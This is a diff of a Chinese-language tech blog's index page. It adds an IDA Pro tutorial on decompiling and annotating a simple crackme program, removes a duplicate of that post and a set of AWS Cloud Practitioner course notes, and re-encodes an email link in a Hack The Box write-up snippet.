+<li>按 <code>n</code> 重命名</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/revcra2_Untitled_1.png" alt="Untitled"></p>
+<p>另一個v5也通過n命名成serial</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br></pre></td></tr></table></figure>
+
+<p>v6 、 v7 是結構，進入結構創建一個新的結構</p>
+<p><img src="/img/revcra2_Untitled_2.png" alt="Untitled"></p>
+<p>fn+ins 或是右鍵選擇Add struct.. &gt; 命名 keybank</p>
+<p><img src="/img/revcra2_Untitled_3.png" alt="Untitled"></p>
+<p><img src="/img/revcra2_Untitled_4.png" alt="Untitled"></p>
+<p>再來插入兩個成員及兩個欄位，並命名變數名稱，對欄位按 n</p>
+<p><img src="/img/revcra2_Untitled_5.png" alt="Untitled"></p>
+<p>按兩次 <code>d</code> 才是 4 bytes</p>
+<ul>
+<li>int → 4 bytes</li>
+<li>double → 8 bytes</li>
+<li>char → 1 bytes</li>
+</ul>
+<p><img src="/img/revcra2_Untitled_6.png" alt="Untitled"></p>
+<p>把這結構加到C程式中</p>
+<p>對 <code>v6</code> 按 <code>y</code> 並取名前面命名的struct的名稱&gt; set the type</p>
+<p><img src="/img/revcra2_Untitled_7.png" alt="Untitled"></p>
+<p><img src="/img/revcra2_Untitled_8.png" alt="Untitled"></p>
+<p><img src="/img/revcra2_Untitled_9.png" alt="Untitled"></p>
+<p>重新命名v6 &gt; Keybank</p>
+<p><img src="/img/revcra2_Untitled_10.png" alt="Untitled"></p>
+<p><img src="/img/revcra2_Untitled_11.png" alt="Untitled"></p>
+<ul>
+<li>修改變數名稱使程式更易讀</li>
+<li>進行分析時知道更多訊息，隨時可以修改變數名稱</li>
+</ul>
+<p>如果想把這邊的程式視圖與反彙編視圖同步</p>
+<p>右鍵&gt;Synchrinize..&gt;IDA VIew A…</p>
+<p>通過點擊程式碼的位置可以注意到跟視圖的位置是同步的，綠色區塊</p>
+<p><img src="/img/revcra2_Untitled_12.png" alt="Untitled"></p>
+<p>也可以雙擊凾式看到裡面的反編譯後的程式碼</p>
+<p><img src="/img/revcra2_Untitled_13.png" alt="Untitled"></p>
+<p><img src="/img/revcra2_Untitled_14.png" alt="Untitled"></p>
+<p><img src="/img/revcra2_Untitled_15.png" alt="Untitled"></p>
+<p>可以併排停靠在一個視窗中，比較方便查看</p>
+<p>到視圖中F5反編譯程式碼後，將反編譯的視窗拖曳到主視圖的右側位置</p>
+<p><img src="/img/revcra2_Untitled_16.png" alt="Untitled"></p>
+<p>這樣是最快瀏覽及對照程式運行過程的方式</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+  
     <article id="post-Crackme" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1846,119 +2735,6 @@ z=2
 <ul>
 <li>位元數必須相同，不然可能蓋到其他指令</li>
 </ul>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-  
-    <article id="post-Crackme2" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/12/21/Crackme2/" class="article-date">
-  	<time datetime="2024-12-21T12:32:07.079Z" itemprop="datePublished">2024-12-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/12/21/Crackme2/">
-        IDA - Crack me2
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Crack-me2"><a href="#Crack-me2" class="headerlink" title="Crack me2"></a>Crack me2</h1><p>使用IDA進行反編譯及創建結構</p>
-<p>執行檔案看看</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remnux@remnux:~/Documents/crackme (1)/crackme$ ./crackme2</span><br><span class="line">enter key:dde</span><br><span class="line">enter serial:</span><br><span class="line">Wrong</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>原始碼</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">struct Keybank &#123;</span><br><span class="line"></span><br><span class="line">	int key;</span><br><span class="line">	int serial;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">success</span></span>()&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nCorrect\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">fail</span></span>()&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWrong\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">	int key = 0;</span><br><span class="line">	int serial = 0;</span><br><span class="line"></span><br><span class="line">	struct Keybank kb;</span><br><span class="line"></span><br><span class="line">  kb.key = 1337;</span><br><span class="line">	kb.serial = 1;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter key:&quot;</span>);</span><br><span class="line">	scanf(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter serial:&quot;</span>);</span><br><span class="line">	scanf(<span class="string">&quot;%d&quot;</span>, &amp;serial);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( key == kb.key &amp;&amp; serial == kb.serial) success();</span><br><span class="line">	<span class="keyword">else</span> fail();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>開啟IDA並反編譯</p>
-<p>View &gt; Open subviews&gt;Generate pseudocode</p>
-<p>快捷鍵 <code>F5</code> </p>
-<p><img src="/img/revcra2_Untitled.png" alt="Untitled"></p>
-<p>可以通過重新命名讓程式比較容易理解</p>
-<p>比如這邊是要求用戶輸入key → v4</p>
-<ul>
-<li>按 <code>n</code> 重命名</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/revcra2_Untitled_1.png" alt="Untitled"></p>
-<p>另一個v5也通過n命名成serial</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br></pre></td></tr></table></figure>
-
-<p>v6 、 v7 是結構，進入結構創建一個新的結構</p>
-<p><img src="/img/revcra2_Untitled_2.png" alt="Untitled"></p>
-<p>fn+ins 或是右鍵選擇Add struct.. &gt; 命名 keybank</p>
-<p><img src="/img/revcra2_Untitled_3.png" alt="Untitled"></p>
-<p><img src="/img/revcra2_Untitled_4.png" alt="Untitled"></p>
-<p>再來插入兩個成員及兩個欄位，並命名變數名稱，對欄位按 n</p>
-<p><img src="/img/revcra2_Untitled_5.png" alt="Untitled"></p>
-<p>按兩次 <code>d</code> 才是 4 bytes</p>
-<ul>
-<li>int → 4 bytes</li>
-<li>double → 8 bytes</li>
-<li>char → 1 bytes</li>
-</ul>
-<p><img src="/img/revcra2_Untitled_6.png" alt="Untitled"></p>
-<p>把這結構加到C程式中</p>
-<p>對 <code>v6</code> 按 <code>y</code> 並取名前面命名的struct的名稱&gt; set the type</p>
-<p><img src="/img/revcra2_Untitled_7.png" alt="Untitled"></p>
-<p><img src="/img/revcra2_Untitled_8.png" alt="Untitled"></p>
-<p><img src="/img/revcra2_Untitled_9.png" alt="Untitled"></p>
-<p>重新命名v6 &gt; Keybank</p>
-<p><img src="/img/revcra2_Untitled_10.png" alt="Untitled"></p>
-<p><img src="/img/revcra2_Untitled_11.png" alt="Untitled"></p>
-<ul>
-<li>修改變數名稱使程式更易讀</li>
-<li>進行分析時知道更多訊息，隨時可以修改變數名稱</li>
-</ul>
-<p>如果想把這邊的程式視圖與反彙編視圖同步</p>
-<p>右鍵&gt;Synchrinize..&gt;IDA VIew A…</p>
-<p>通過點擊程式碼的位置可以注意到跟視圖的位置是同步的，綠色區塊</p>
-<p><img src="/img/revcra2_Untitled_12.png" alt="Untitled"></p>
-<p>也可以雙擊凾式看到裡面的反編譯後的程式碼</p>
-<p><img src="/img/revcra2_Untitled_13.png" alt="Untitled"></p>
-<p><img src="/img/revcra2_Untitled_14.png" alt="Untitled"></p>
-<p><img src="/img/revcra2_Untitled_15.png" alt="Untitled"></p>
-<p>可以併排停靠在一個視窗中，比較方便查看</p>
-<p>到視圖中F5反編譯程式碼後，將反編譯的視窗拖曳到主視圖的右側位置</p>
-<p><img src="/img/revcra2_Untitled_16.png" alt="Untitled"></p>
-<p>這樣是最快瀏覽及對照程式運行過程的方式</p>
 
       
     </div>
@@ -3137,7 +3913,7 @@ z=2
 </ul>
 <p>now write &#x2F;etc&#x2F;hosts Add three domains to this file</p>
 <p><img src="/img/Brainfuck_Untitled_4.png" alt="Untitled"></p>
-<p>when I browse <a target="_blank" rel="noopener" href="https://brainfuck.htb/">https:&#x2F;&#x2F;**brainfuck.htb</a>** website,The webpage directly indicates that he is a wordpress website, and pointing to the SMTP mail ID <a href="mailto:&#111;&#x72;&#x65;&#115;&#116;&#x69;&#x73;&#64;&#98;&#x72;&#x61;&#105;&#x6e;&#102;&#117;&#99;&#107;&#46;&#104;&#x74;&#98;">&#111;&#x72;&#x65;&#115;&#116;&#x69;&#x73;&#64;&#98;&#x72;&#x61;&#105;&#x6e;&#102;&#117;&#99;&#107;&#46;&#104;&#x74;&#98;</a></p>
+<p>when I browse <a target="_blank" rel="noopener" href="https://brainfuck.htb/">https:&#x2F;&#x2F;**brainfuck.htb</a>** website,The webpage directly indicates that he is a wordpress website, and pointing to the SMTP mail ID <a href="mailto:&#111;&#114;&#101;&#115;&#116;&#105;&#x73;&#64;&#98;&#114;&#x61;&#105;&#110;&#x66;&#117;&#x63;&#x6b;&#x2e;&#x68;&#x74;&#98;">&#111;&#114;&#101;&#115;&#116;&#105;&#x73;&#64;&#98;&#114;&#x61;&#105;&#110;&#x66;&#117;&#x63;&#x6b;&#x2e;&#x68;&#x74;&#98;</a></p>
 <p><img src="/img/Brainfuck_Untitled_5.png" alt="Untitled"></p>
 <p>Check whether there are any types of vulnerable themes, plug-ins, user names, etc.</p>
 <ul>
@@ -3666,1167 +4442,6 @@ z=2
 <li><input disabled="" type="checkbox"> • <strong>Dedicated Hosts</strong></li>
 <li><input disabled="" type="checkbox"> • <strong>Dedicated Instances</strong></li>
 </ul>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-  
-    <article id="post-AWS34" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/12/21/AWS34/" class="article-date">
-  	<time datetime="2024-12-21T12:32:07.074Z" itemprop="datePublished">2024-12-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/12/21/AWS34/">
-        AWS infrastructure 2
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="單元-3-簡介"><a href="#單元-3-簡介" class="headerlink" title="單元 3 簡介"></a><strong>單元 3 簡介</strong></h1><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">高可用性概念</span><br><span class="line">└─ 提供可靠服務的能力，即使面臨突發事件或故障</span><br><span class="line"></span><br><span class="line">AWS 全球基礎設施</span><br><span class="line">├─ 資源分佈</span><br><span class="line">│    ├─ 遍布全球各地的 AWS 區域</span><br><span class="line">│    │    ├─ 提供高可用性和容錯能力</span><br><span class="line">│    │    └─ 客戶可以在不同區域使用 AWS 服務</span><br><span class="line">│    └─ 每個區域有多個可用區域</span><br><span class="line">│         └─ 提供在單一區域中提高可用性和容錯能力的選項</span><br><span class="line">└─ 用咖啡店比喻</span><br><span class="line"><span class="code">     ├─ 分店分佈</span></span><br><span class="line"><span class="code">     │    ├─ 在不同地點開設的咖啡店</span></span><br><span class="line"><span class="code">     │    └─ 客戶可前往其他分店繼續享用服務</span></span><br><span class="line"><span class="code">     └─ 遇到突發事件</span></span><br><span class="line"><span class="code">          ├─ 如遊行、水災或停電</span></span><br><span class="line"><span class="code">          └─ 客戶仍能在其他分店繼續享用服務</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
-
-<h2 id="AWS-全球基礎設施"><a href="#AWS-全球基礎設施" class="headerlink" title="AWS 全球基礎設施"></a><strong>AWS 全球基礎設施</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">基本業務需求</span><br><span class="line">└─ 應用程式執行、內容存儲、資料分析等需求</span><br><span class="line"></span><br><span class="line">資料中心的挑戰</span><br><span class="line">└─ 天災或故障導致與資料中心失去連線</span><br><span class="line"><span class="code">    └─ 自經營資料中心至資料備份等解決方式，但存在成本與風險</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">AWS 全球基礎設施</span><br><span class="line">├─ 區域建立</span><br><span class="line">│   ├─ 全球各地 AWS 區域</span><br><span class="line">│   │   └─ 包含多個可用區域</span><br><span class="line">│   │       └─ 擁有完整運算、儲存和服務設施</span><br><span class="line">│   └─ 區域間連線</span><br><span class="line">│        └─ 透過高速光纖網路連線</span><br><span class="line">│             └─ 提供全球營運支援</span><br><span class="line">└─ 區域資料主權</span><br><span class="line"><span class="code">     ├─ 資料受當地法律和國家法令約束</span></span><br><span class="line"><span class="code">     └─ 資料不會跨區域轉移</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">選取區域</span><br><span class="line">├─ 符合資料管控和法規要求</span><br><span class="line">│    └─ 根據公司及位置需求，在特定區域執行資料，如倫敦地區</span><br><span class="line">├─ 接近您的客戶,考慮與客戶群距離</span><br><span class="line">│    └─ 選取靠近客戶地區，加速內容傳遞，如維吉尼亞北部地區和新加坡</span><br><span class="line">├─ 區域內的可用服務,功能可用性</span><br><span class="line">│    └─ 考慮區域內提供的服務和功能，如Amazon Braket 在特定區域的可用性</span><br><span class="line">└─ 定價</span><br><span class="line"><span class="code">     └─ 考慮區域的價格成本，如聖保羅地區相比奧勒岡州的成本增加50%</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
-
-<h2 id="節點"><a href="#節點" class="headerlink" title="節點"></a><strong>節點</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">AWS 全球基礎設施好處</span><br><span class="line">├─ 能提供更好的客戶服務</span><br><span class="line">├─ 可在全球各地建立衛星分店來服務客戶</span><br><span class="line">├─ 可在當地放置資料複本或快取，提高存取效率</span><br><span class="line">│   └─ 使用 CDN 概念，如 AWS CloudFront</span><br><span class="line">└─ 提供 AWS Outposts 解決方案，可在自己的大樓內使用 AWS 服務</span><br><span class="line"></span><br><span class="line">CDN Amazon CloudFront</span><br><span class="line">├─ 用於提供全球客戶資料、影片、應用程式和 API 的服務</span><br><span class="line">├─ 具有低延遲和高傳輸速度特性</span><br><span class="line">└─ 使用節點技術，在全球協助加速與使用者的通訊</span><br><span class="line"></span><br><span class="line">AWS 節點功能</span><br><span class="line">├─ 執行 CloudFront</span><br><span class="line">├─ 執行 DNS，如 Amazon Route 53</span><br><span class="line">└─ 可在全球範圍內加快通訊和內容交付</span><br><span class="line"></span><br><span class="line">AWS Outposts</span><br><span class="line">└─ 安裝一個完整運作的迷你區域在您的資料中心內，由 AWS 操作</span><br><span class="line"><span class="code">    └─ 提供 AWS 全功能，但設備獨立在您的大樓內</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/AWS34.png" alt="Untitled"></p>
-<ol>
-<li>來源: 假設公司的資料存放在巴西，而您有住在中國的客戶。若要提供內容給這些客戶，您並不需要將所有內容都移至某個中國區域。</li>
-<li>節點: 您可以在靠近中國客戶的節點對本機的副本進行快取，不需要讓客戶從巴西取得資料。 </li>
-<li>客戶: 如果中國的客戶請求您的某個檔案，Amazon CloudFront 會從節點的快取中擷取檔案，然後將檔案傳送給客戶。由於檔案來自中國附近的節點，而非巴西的原始來源，因此檔案交付給客戶的速度更快。</li>
-</ol>
-<h2 id="如何佈建-AWS-資源"><a href="#如何佈建-AWS-資源" class="headerlink" title="如何佈建 AWS 資源"></a><strong>如何佈建 AWS 資源</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">與 AWS 服務互動的方式</span><br><span class="line">├─ 使用 API 呼叫</span><br><span class="line">│   ├─ AWS 管理主控台</span><br><span class="line">│   ├─ AWS 命令列界面 (CLI)</span><br><span class="line">│   └─ 軟體開發套件 (SDK)</span><br><span class="line">│   </span><br><span class="line">├─ AWS 管理主控台</span><br><span class="line">│   ├─ Web 為基礎的介面</span><br><span class="line">│   ├─ 可用於存取和管理 Amazon 服務</span><br><span class="line">│   ├─ 包括精靈和自動化工作流程</span><br><span class="line">│   └─ 可透過行動應用程式執行監控資源、檢視警示和存取帳單資訊</span><br><span class="line"></span><br><span class="line">├─ AWS 命令列界面 (CLI)</span><br><span class="line">│   ├─ 讓您從命令列控制多個 AWS 服務</span><br><span class="line">│   ├─ 適用於 Windows、macOS 和 Linux</span><br><span class="line">│   └─ 可用於自動化服務和應用程式動作</span><br><span class="line"></span><br><span class="line">└─ 軟體開發套件 (SDK)</span><br><span class="line"><span class="code">    ├─ 透過專為程式設計語言或平台設計的 API</span></span><br><span class="line"><span class="code">    ├─ 可讓您更輕鬆地使用 AWS 服務</span></span><br><span class="line"><span class="code">    └─ 支援的程式設計語言包括 C++、Java、.NET 等</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/AWS34_1.png" alt="Untitled"></p>
-<p><img src="/img/AWS34_2.png" alt="Untitled"></p>
-<p><img src="/img/AWS34_3.png" alt="Untitled"></p>
-<p><img src="/img/AWS34_4.png" alt="Untitled"></p>
-<p><img src="/img/AWS34_5.png" alt="Untitled"></p>
-<p><img src="/img/AWS34_6.png" alt="Untitled"></p>
-<p>手動操作容易可能忘記勾選選項或是遺漏設定</p>
-<p>使用可讓你撰寫或程式設計的API呼叫工具 - AWS CLI</p>
-<ul>
-<li>撰寫指令啟動EC2 - 指令可重複輸入，減少出錯率</li>
-<li>程式以排程的方式執行</li>
-<li>自動化部屬應用</li>
-</ul>
-<p><img src="/img/AWS34_7.png" alt="Untitled"></p>
-<p><img src="/img/AWS34_8.png" alt="Untitled"></p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">與 AWS 互動的方式</span><br><span class="line">├─ 使用 API 呼叫</span><br><span class="line">│   ├─ AWS 管理主控台</span><br><span class="line">│   ├─ AWS 命令列界面 (CLI)</span><br><span class="line">│   └─ 軟體開發套件 (SDK)</span><br><span class="line">│   </span><br><span class="line">├─ AWS 管理主控台</span><br><span class="line">│   ├─ Web 為基礎的介面</span><br><span class="line">│   ├─ 可用於存取和管理 Amazon 服務</span><br><span class="line">│   ├─ 包括精靈和自動化工作流程</span><br><span class="line">│   └─ 可透過行動應用程式執行監控資源、檢視警示和存取帳單資訊</span><br><span class="line"></span><br><span class="line">├─ AWS 命令列界面 (CLI)</span><br><span class="line">│   ├─ 讓您從命令列控制多個 AWS 服務</span><br><span class="line">│   ├─ 適用於 Windows、macOS 和 Linux</span><br><span class="line">│   └─ 可用於自動化服務和應用程式動作</span><br><span class="line"></span><br><span class="line">├─ 軟體開發套件 (SDK)</span><br><span class="line">│   ├─ 透過專為程式設計語言或平台設計的 API</span><br><span class="line">│   ├─ 可讓您更輕鬆地使用 AWS 服務</span><br><span class="line">│   └─ 支援的程式設計語言包括 C++、Java、.NET 等</span><br><span class="line"></span><br><span class="line">├─ AWS Elastic Beanstalk</span><br><span class="line">│   ├─ 負責佈建環境所需的資源</span><br><span class="line">│   │   ├─ 調整容量</span><br><span class="line">│   │   ├─ 負載平衡</span><br><span class="line">│   │   ├─ 自動擴展</span><br><span class="line">│   │   └─ 應用程式運作狀態監控</span><br><span class="line"></span><br><span class="line">└─ AWS CloudFormation</span><br><span class="line"><span class="code">    ├─ Infrastructure as Code 工具</span></span><br><span class="line"><span class="code">    ├─ 使用 JSON 或 YAML 文件定義 AWS 資源</span></span><br><span class="line"><span class="code">    ├─ 可重複部署且自動化建立基礎設施</span></span><br><span class="line"><span class="code">    └─ 在堆疊管理中提供自動復原變更的功能</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/AWS34_9.png" alt="Untitled"></p>
-<p><img src="/img/AWS34_10.png" alt="Untitled"></p>
-<p><img src="/img/AWS34_11.png" alt="Untitled"></p>
-<p><img src="/img/AWS34_12.png" alt="Untitled"></p>
-<h2 id="單元-3-總結"><a href="#單元-3-總結" class="headerlink" title="單元 3 總結"></a><strong>單元 3 總結</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">AWS 全球基礎設施</span><br><span class="line">├─ 可用區域形成區域，遍及全球</span><br><span class="line">│   ├─ 選擇在哪個區域和可用區域運作</span><br><span class="line">│   └─ 建議至少在兩個可用區域部署基礎設施</span><br><span class="line">│   </span><br><span class="line">├─ 自動部署多個可用區域的服務</span><br><span class="line">│   ├─ Elastic Load Balancing</span><br><span class="line">│   ├─ Amazon SQS</span><br><span class="line">│   └─ Amazon SNS</span><br><span class="line">│   </span><br><span class="line">├─ 節點部署內容以加速提供給客戶的速度</span><br><span class="line">│   </span><br><span class="line">└─ AWS Outposts</span><br><span class="line"><span class="code">    └─ 邊緣裝置，讓您在自己的資料中心運作 AWS 基礎設施</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">AWS 資源佈建工具</span><br><span class="line">├─ AWS Management Console</span><br><span class="line">├─ 開發套件 SDK</span><br><span class="line">├─ CLI</span><br><span class="line">├─ AWS Elastic Beanstalk</span><br><span class="line">└─ AWS CloudFormation</span><br><span class="line"><span class="code">    └─ 將基礎設施設定為程式碼</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
-
-<h3 id="單元-3-測驗"><a href="#單元-3-測驗" class="headerlink" title="單元 3 測驗"></a><strong>單元 3 測驗</strong></h3><p>關於 AWS 全球基礎設施，以下哪個敘述正確？</p>
-<ul>
-<li><input disabled="" type="checkbox"> 區域只含單一可用區域。</li>
-<li><input disabled="" type="checkbox"> 可用區域由兩個或多個區域組成。</li>
-<li><input checked="" disabled="" type="checkbox"> 區域由三個或多個可用區域組成。</li>
-</ul>
-<blockquote>
-<p>正確的回答選項是<strong>區域由三個或多個可用區域組成</strong>。</p>
-<p>例如，南美洲（聖保羅）區域是 sa-east-1。它包含三個可用區域：sa-east-1<strong>a</strong>、sa-east-1<strong>b</strong> 以及 sa-east-1<strong>c</strong>。</p>
-</blockquote>
-<ul>
-<li><input disabled="" type="checkbox"> 可用區域只含單一區域。</li>
-</ul>
-<p>選擇區域時應考慮哪些因素？(請選取兩個。)</p>
-<ul>
-<li><input checked="" disabled="" type="checkbox"> 符合資料管控和法規要求</li>
-<li><input checked="" disabled="" type="checkbox"> 接近您的客戶</li>
-<li><input disabled="" type="checkbox"> 全天候皆可取得技術支援</li>
-<li><input disabled="" type="checkbox"> 可向不同使用者指派自訂權限的功能</li>
-<li><input disabled="" type="checkbox"> 存取 AWS 命令列界面 (AWS CLI)</li>
-</ul>
-<blockquote>
-<p>另外兩個在選取區域時要考慮的因素是定價和區域中的可用服務。</p>
-<p>其他回答選項皆不正確，因為：</p>
-<ul>
-<li>您選擇的支援層級並不是由區域決定。</li>
-<li>向不同使用者指派自訂權限是在所有 AWS 區域都可以使用的功能。</li>
-<li>AWS 命令列界面 (AWS CLI) 適用於所有 AWS 區域。</li>
-</ul>
-</blockquote>
-<p>以下哪個敘述與 Amazon CloudFront 最相符？</p>
-<ul>
-<li><input disabled="" type="checkbox"> 一種可讓您以混合雲端方法執行基礎設施的服務</li>
-<li><input disabled="" type="checkbox"> 一種容器專用的無伺服器運算引擎</li>
-<li><input disabled="" type="checkbox"> 一種可讓您透過佇列在軟體元件之間傳送和接收訊息的服務</li>
-<li><input checked="" disabled="" type="checkbox"> 全球內容交付服務</li>
-</ul>
-<blockquote>
-<p>正確的回答選項是<strong>全球內容交付服務</strong>。</p>
-<p>Amazon CloudFront 是一種內容交付服務。這項服務使用節點網路來快取內容，並將內容交付給世界各地的客戶。內容經過快取後，會以副本形式存放在本機。這些內容可能是影片檔案、相片、網頁等。</p>
-<p>其他選項皆不正確，因為：</p>
-<ul>
-<li>AWS Outposts 這項服務可讓您以混合雲端方法執行基礎設施。</li>
-<li>AWS Fargate 是一種容器專用的無伺服器運算引擎。</li>
-<li>Amazon Simple Queue Service (Amazon SQS) 這項服務可讓您透過佇列在軟體元件之間傳送、存放和接收訊息。</li>
-</ul>
-</blockquote>
-<p>Amazon CloudFront 使用以下哪個站點來快取內容副本，藉此在任何位置都能快速交付給使用者？</p>
-<ul>
-<li><input disabled="" type="checkbox"> 區域</li>
-<li><input disabled="" type="checkbox"> 可用區域</li>
-<li><input checked="" disabled="" type="checkbox"> 節點</li>
-</ul>
-<blockquote>
-<p>其他回答選項皆不正確，因為：</p>
-<ul>
-<li>區域是指一個獨立的地理位置，其中的多個位置是彼此分隔的。</li>
-<li>可用區域在 AWS 全球基礎設施中是完全分隔的。</li>
-<li>來源是指 CloudFront 取得檔案的伺服器。CloudFront 原始伺服器的範例包括 Amazon Simple Storage Service (Amazon S3) 儲存貯體和 Web 伺服器。</li>
-</ul>
-</blockquote>
-<ul>
-<li><input disabled="" type="checkbox"> 來源</li>
-</ul>
-<p>您可以使用 AWS Outposts 執行以下哪個動作？</p>
-<ul>
-<li><input disabled="" type="checkbox"> 透過指令碼自動化 AWS 服務和應用程式動作。</li>
-<li><input disabled="" type="checkbox"> 存取精靈和自動化工作流程，以便在 AWS 服務中執行任務。</li>
-<li><input disabled="" type="checkbox"> 以支援的程式設計語言開發 AWS 應用程式。</li>
-<li><input checked="" disabled="" type="checkbox"> 將 AWS 基礎設施和服務延伸到不同位置，包括您的內部部署資料中心。</li>
-</ul>
-<blockquote>
-<p>其他選項皆不正確，因為：</p>
-<ul>
-<li>AWS 命令列界面 (AWS CLI) 是用於透過指令碼來自動化 AWS 服務和應用程式動作。</li>
-<li>AWS 管理主控台包含可用來在 AWS 服務中完成任務的精靈和工作流程。</li>
-<li>軟體開發套件 (SDK) 可讓您以支援的程式設計語言開發 AWS 應用程式。</li>
-</ul>
-</blockquote>
-<h1 id="單元-4-簡介"><a href="#單元-4-簡介" class="headerlink" title="單元 4 簡介"></a><strong>單元 4 簡介</strong></h1><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Amazon Virtual Private Cloud (VPC)</span><br><span class="line">├─ 允許在 AWS Cloud 中建立邏輯隔離部分</span><br><span class="line">├─ 允許在自定義的虛擬網路中啟動 AWS 資源</span><br><span class="line">│   ├─ 資源可以是向外公開的，可透過網際網路存取</span><br><span class="line">│   └─ 資源也可以是私有的，不能從網際網路存取，通常用於後端服務</span><br><span class="line">│   </span><br><span class="line">└─ 公有和私有的資源群組稱為子網路，有各自的 IP 地址範圍</span><br><span class="line"></span><br><span class="line">拿咖啡店舉例</span><br><span class="line">├─ 收銀員</span><br><span class="line">│   └─ 負責點餐，分配到公有子網路，與客人互動</span><br><span class="line">│   </span><br><span class="line">└─ 咖啡師</span><br><span class="line"><span class="code">    └─ 專心製作咖啡，分配到私有子網路，避免直接與客人互動</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
-
-<h2 id="AWS-的連線能力"><a href="#AWS-的連線能力" class="headerlink" title="AWS 的連線能力"></a><strong>AWS 的連線能力</strong></h2><p><img src="/img/AWS34_13.png" alt="Untitled"></p>
-<p><img src="/img/AWS34_14.png" alt="Untitled"></p>
-<p><img src="/img/AWS34_15.png" alt="Untitled"></p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Amazon Virtual Private Cloud (Amazon VPC)</span><br><span class="line">├─ 允許在 AWS Cloud 中建立邏輯隔離部分</span><br><span class="line">├─ 在這個分隔區段中，您可以在自己定義的虛擬網路中啟動資源</span><br><span class="line">│   ├─ 資源可以是向外公開的，可透過網際網路存取</span><br><span class="line">│   └─ 資源也可以是私有的，不能從網際網路存取，通常用於後端服務</span><br><span class="line">│   </span><br><span class="line">└─ 子網路是 VPC 的一個區段，當中可包含 Amazon EC2 執行個體等資源</span><br><span class="line"></span><br><span class="line">網際網路閘道</span><br><span class="line">└─ 網際網路閘道是 VPC 和網際網路之間的連結</span><br><span class="line">   ├─ 類似於咖啡店的前門，允許公有流量存取 VPC</span><br><span class="line">   └─ 沒有網際網路閘道，任何人都無法存取 VPC 內的資源</span><br><span class="line"></span><br><span class="line">虛擬私有閘道</span><br><span class="line">└─ 虛擬私有閘道是允許受保護的網際網路流量進入 VPC 的元件</span><br><span class="line">   